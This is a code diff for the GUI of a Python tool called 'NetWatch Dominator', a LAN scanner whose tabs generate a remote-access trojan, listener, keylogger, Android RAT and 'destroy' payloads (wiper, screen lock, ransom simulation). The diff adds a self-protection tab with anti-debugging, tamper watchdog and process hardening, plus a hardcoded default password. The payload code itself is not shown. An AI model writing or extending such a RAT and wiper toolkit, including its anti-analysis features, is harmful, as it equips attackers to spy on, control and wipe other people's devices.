@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""Dark cyber GUI — real control + destroy"""
+"""Dark hardened GUI — model column, security status"""
 
 import customtkinter as ctk
 import threading
@@ -12,14 +12,15 @@ ctk.set_appearance_mode("dark")
 ctk.set_default_color_theme("dark-blue")
 
 class DominatorGUI:
-    def __init__(self, scanner, bans, history, payloads):
+    def __init__(self, scanner, bans, history, payloads, security=None):
         self.scanner = scanner
         self.bans = bans
         self.history = history
         self.payloads = payloads
+        self.sec = security
         self.root = ctk.CTk()
         self.root.title("NetWatch Dominator")
-        self.root.geometry("1200x780")
+        self.root.geometry("1280x800")
         self.root.configure(fg_color="#0a0a0c")
         self._build()
 
@@ -29,8 +30,8 @@ class DominatorGUI:
         top.pack_propagate(False)
         ctk.CTkLabel(top, text="NETWATCH DOMINATOR", font=ctk.CTkFont(size=18, weight="bold"),
                      text_color="#00f0ff").pack(side="left", padx=16)
-        ctk.CTkLabel(top, text="● REAL CONTROL LAYER", text_color="#ff2a2a",
-                     font=ctk.CTkFont(size=12)).pack(side="left", padx=8)
+        sec_txt = "● HARDENED" if self.sec else "●"
+        ctk.CTkLabel(top, text=sec_txt, text_color="#ff2a2a", font=ctk.CTkFont(size=12)).pack(side="left", padx=8)
         ctk.CTkButton(top, text="REFRESH", width=90, fg_color="#1a1a24", hover_color="#ff2a2a",
                       command=self.refresh).pack(side="right", padx=6, pady=8)
         ctk.CTkButton(top, text="START LIVE", width=100, fg_color="#1a1a24", hover_color="#00f0ff",
@@ -44,10 +45,10 @@ class DominatorGUI:
                                    segmented_button_selected_hover_color="#cc2222",
                                    text_color="#cccccc")
         self.tabs.pack(fill="both", expand=True, padx=8, pady=6)
-        for name in ("Live", "History", "Bans", "Control", "Destroy", "Tools"):
+        for name in ("Live", "History", "Bans", "Control", "Destroy", "Security", "Tools"):
             self.tabs.add(name)
 
-        # LIVE
+        # LIVE — MODEL column
         self.live_box = ctk.CTkTextbox(self.tabs.tab("Live"), font=ctk.CTkFont(family="Consolas", size=13),
                                        fg_color="#0f0f14", text_color="#e0e0e0")
         self.live_box.pack(fill="both", expand=True, padx=4, pady=4)
@@ -61,7 +62,6 @@ class DominatorGUI:
         ]:
             ctk.CTkButton(lb, text=txt, command=cmd, fg_color=col, hover_color="#cc2222", width=120).pack(side="left", padx=4)
 
-        # HISTORY / BANS same as before
         self.hist_box = ctk.CTkTextbox(self.tabs.tab("History"), font=ctk.CTkFont(family="Consolas", size=12), fg_color="#0f0f14")
         self.hist_box.pack(fill="both", expand=True, padx=4, pady=4)
         hb = ctk.CTkFrame(self.tabs.tab("History"), fg_color="transparent")
@@ -77,10 +77,10 @@ class DominatorGUI:
         ctk.CTkButton(bb, text="UNBAN", command=self.unban_selected, fg_color="#1a1a24").pack(side="left", padx=4)
         ctk.CTkButton(bb, text="EXPORT", command=self.export_bans, fg_color="#1a1a24").pack(side="left", padx=4)
 
-        # CONTROL — real RAT
+        # CONTROL
         cf = ctk.CTkFrame(self.tabs.tab("Control"), fg_color="#0f0f14")
         cf.pack(fill="both", expand=True, padx=8, pady=8)
-        ctk.CTkLabel(cf, text="REAL CONTROL — full RAT + listener + keylog + android",
+        ctk.CTkLabel(cf, text="REAL CONTROL — full RAT · listener · keylog · android",
                      text_color="#00f0ff", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=6)
         row = ctk.CTkFrame(cf, fg_color="transparent")
         row.pack(fill="x", pady=4)
@@ -92,29 +92,49 @@ class DominatorGUI:
         self.lport = ctk.CTkEntry(row, width=70, fg_color="#1a1a24")
         self.lport.insert(0, "4444")
         self.lport.pack(side="left", padx=4)
-        for txt, k in [("FULL RAT", "rat"), ("LISTENER", "listen"), ("KEYLOGGER", "key"),
-                       ("ANDROID RAT", "and")]:
+        for txt, k in [("FULL RAT", "rat"), ("LISTENER", "listen"), ("KEYLOGGER", "key"), ("ANDROID RAT", "and")]:
             ctk.CTkButton(row, text=txt, width=110, fg_color="#1a1a24", hover_color="#00f0ff",
                           command=lambda x=k: self.gen_control(x)).pack(side="left", padx=3)
-        self.ctrl_status = ctk.CTkLabel(cf, text="shell · file get/put · screenshot · persist · ps · sysinfo", text_color="#00f0ff")
+        self.ctrl_status = ctk.CTkLabel(cf, text="shell · file · screenshot · persist · ps · sysinfo", text_color="#00f0ff")
         self.ctrl_status.pack(anchor="w", pady=4)
-        self.ctrl_list = ctk.CTkTextbox(cf, height=240, fg_color="#0a0a0c")
+        self.ctrl_list = ctk.CTkTextbox(cf, height=220, fg_color="#0a0a0c")
         self.ctrl_list.pack(fill="both", expand=True)
 
         # DESTROY
         df = ctk.CTkFrame(self.tabs.tab("Destroy"), fg_color="#0f0f14")
         df.pack(fill="both", expand=True, padx=8, pady=8)
-        ctk.CTkLabel(df, text="REAL DESTROY SIM — full combo · wiper · android",
+        ctk.CTkLabel(df, text="DESTROY SIM — full combo · wiper · android",
                      text_color="#ff2a2a", font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=6)
         drow = ctk.CTkFrame(df, fg_color="transparent")
         drow.pack(fill="x", pady=4)
         for txt, k in [("FULL DESTROY", "full"), ("WIPER SIM", "wipe"), ("ANDROID DESTROY", "and_d")]:
             ctk.CTkButton(drow, text=txt, width=140, fg_color="#2a0a0a", hover_color="#ff2a2a",
                           command=lambda x=k: self.gen_destroy(x)).pack(side="left", padx=3)
-        self.des_status = ctk.CTkLabel(df, text="lock + popups + mem/cpu + ransom-sim + optional BSOD", text_color="#ff2a2a")
+        self.des_status = ctk.CTkLabel(df, text="lock + popups + mem/cpu + ransom-sim", text_color="#ff2a2a")
         self.des_status.pack(anchor="w", pady=4)
-        self.des_list = ctk.CTkTextbox(df, height=240, fg_color="#0a0a0c")
+        self.des_list = ctk.CTkTextbox(df, height=220, fg_color="#0a0a0c")
         self.des_list.pack(fill="both", expand=True)
+
+        # SECURITY tab
+        sf = ctk.CTkFrame(self.tabs.tab("Security"), fg_color="#0f0f14")
+        sf.pack(fill="both", expand=True, padx=8, pady=8)
+        ctk.CTkLabel(sf, text="APP SELF-PROTECTION", text_color="#00f0ff",
+                     font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=6)
+        srow = ctk.CTkFrame(sf, fg_color="transparent")
+        srow.pack(fill="x", pady=4)
+        ctk.CTkButton(srow, text="CHECK INTEGRITY", command=self.check_integrity, fg_color="#1a1a24").pack(side="left", padx=4)
+        ctk.CTkButton(srow, text="RE-SEAL", command=self.reseal, fg_color="#1a1a24").pack(side="left", padx=4)
+        ctk.CTkButton(srow, text="ANTI-DEBUG TEST", command=self.test_antidebug, fg_color="#1a1a24").pack(side="left", padx=4)
+        self.sec_out = ctk.CTkTextbox(sf, height=320, fg_color="#0a0a0c")
+        self.sec_out.pack(fill="both", expand=True, pady=6)
+        self.sec_out.insert("end", "Features active:\n")
+        self.sec_out.insert("end", "- PBKDF2 + Fernet encrypted auth blob\n")
+        self.sec_out.insert("end", "- HMAC-SHA256 integrity manifest over core modules\n")
+        self.sec_out.insert("end", "- Anti-debug (IsDebuggerPresent / TracerPid / ptrace)\n")
+        self.sec_out.insert("end", "- Background watchdog (exit on tamper/debug)\n")
+        self.sec_out.insert("end", "- Process harden (PR_SET_DUMPABLE=0 on Linux)\n")
+        self.sec_out.insert("end", "- Secure write path for future encrypted stores\n")
+        self.sec_out.insert("end", "Default lab password: dominator (change in main.py)\n")
 
         # TOOLS
         tf = ctk.CTkFrame(self.tabs.tab("Tools"), fg_color="#0f0f14")
@@ -122,14 +142,12 @@ class DominatorGUI:
         trow = ctk.CTkFrame(tf, fg_color="transparent")
         trow.pack(fill="x", pady=6)
         ctk.CTkButton(trow, text="Router 192.168.1.1", command=lambda: webbrowser.open("http://192.168.1.1"), fg_color="#1a1a24").pack(side="left", padx=4)
-        ctk.CTkButton(trow, text="Router 192.168.0.1", command=lambda: webbrowser.open("http://192.168.0.1"), fg_color="#1a1a24").pack(side="left", padx=4)
         ctk.CTkButton(trow, text="Local Info", command=self.show_local, fg_color="#1a1a24").pack(side="left", padx=4)
         ctk.CTkButton(trow, text="Figma UI", command=lambda: webbrowser.open("https://www.figma.com/design/4utep1StwcVV22QmJ9pBYe"), fg_color="#1a1a24").pack(side="left", padx=4)
         self.tools_out = ctk.CTkTextbox(tf, height=300, fg_color="#0a0a0c")
         self.tools_out.pack(fill="both", expand=True)
 
-        self.status = ctk.CTkLabel(self.root, text="ready — real control layer online", anchor="w",
-                                   text_color="#666", fg_color="#0a0a0c")
+        self.status = ctk.CTkLabel(self.root, text="ready — hardened", anchor="w", text_color="#666", fg_color="#0a0a0c")
         self.status.pack(fill="x", padx=12, pady=4)
 
         self.load_history()
@@ -158,11 +176,13 @@ class DominatorGUI:
             with self.scanner.lock:
                 self.scanner.devices.update(found)
         self.live_box.delete("1.0", "end")
-        self.live_box.insert("end", f"{'IP':<16} {'MAC':<20} {'HOSTNAME':<22} {'VENDOR':<14} {'TYPE':<10} ON\n")
-        self.live_box.insert("end", "─"*100 + "\n")
+        self.live_box.insert("end", f"{'IP':<16} {'MAC':<20} {'MODEL':<22} {'HOSTNAME':<18} {'TYPE':<10} OS\n")
+        self.live_box.insert("end", "─"*110 + "\n")
         for d in sorted(devices, key=lambda x: x.ip):
+            model = getattr(d, "model", None) or getattr(d, "vendor", "Unknown")
+            os_g = getattr(d, "os_guess", "") or "-"
             self.live_box.insert("end",
-                f"{d.ip:<16} {d.mac:<20} {(d.hostname or '-')[:20]:<22} {(d.vendor or '-')[:12]:<14} {d.device_type:<10} {'●' if d.is_online else '○'}\n")
+                f"{d.ip:<16} {d.mac:<20} {model[:20]:<22} {(d.hostname or '-')[:16]:<18} {d.device_type:<10} {os_g}\n")
         self.status.configure(text=f"devices {len(devices)}  |  local {self.scanner.local_ip}  |  bans {len(self.bans.list_bans())}")
 
     def _sel(self):
@@ -222,7 +242,8 @@ class DominatorGUI:
         self.hist_box.delete("1.0", "end")
         for r in self.history.all():
             ts = datetime.fromtimestamp(r.get("last_seen", 0)).strftime("%Y-%m-%d %H:%M")
-            self.hist_box.insert("end", f"{r.get('mac','')}  {r.get('ip','')}  {r.get('hostname','-')[:18]}  x{r.get('seen_count',0)}  {ts}\n")
+            model = r.get("model") or r.get("vendor") or "-"
+            self.hist_box.insert("end", f"{r.get('mac','')}  {r.get('ip','')}  {model[:18]}  {r.get('hostname','-')[:14]}  x{r.get('seen_count',0)}  {ts}\n")
 
     def load_bans(self):
         self.ban_box.delete("1.0", "end")
@@ -282,6 +303,28 @@ class DominatorGUI:
         except Exception as e:
             self.des_status.configure(text=str(e))
 
+    def check_integrity(self):
+        if not self.sec:
+            return
+        base = Path(__file__).parent
+        files = [base / f for f in ("main.py", "scanner.py", "payload.py", "gui.py", "security.py")]
+        ok, msg = self.sec.check_integrity(files)
+        self.sec_out.insert("end", f"\n[integrity] {msg}\n")
+
+    def reseal(self):
+        if not self.sec:
+            return
+        base = Path(__file__).parent
+        files = [base / f for f in ("main.py", "scanner.py", "payload.py", "gui.py", "security.py")]
+        self.sec.seal_integrity(files)
+        self.sec_out.insert("end", "\n[integrity] re-sealed\n")
+
+    def test_antidebug(self):
+        if not self.sec:
+            return
+        clean = self.sec.anti_debug()
+        self.sec_out.insert("end", f"\n[anti-debug] {'clean' if clean else 'DEBUGGER DETECTED'}\n")
+
     def show_local(self):
         self.tools_out.delete("1.0", "end")
         self.tools_out.insert("end", f"Local IP : {self.scanner.local_ip}\n")
@@ -289,7 +332,6 @@ class DominatorGUI:
         self.tools_out.insert("end", f"Iface   : {self.scanner.iface}\n")
         self.tools_out.insert("end", f"Bans    : {len(self.bans.list_bans())}\n")
         self.tools_out.insert("end", f"History : {len(self.history.all())}\n")
-        self.tools_out.insert("end", "\\nRAT commands: shell <cmd> | cd | pwd | ls | get <r> <l> | put <r> <l> | screenshot | ps | persist | sysinfo | kill <pid>\\n")
 
     def run(self):
         self.root.mainloop()
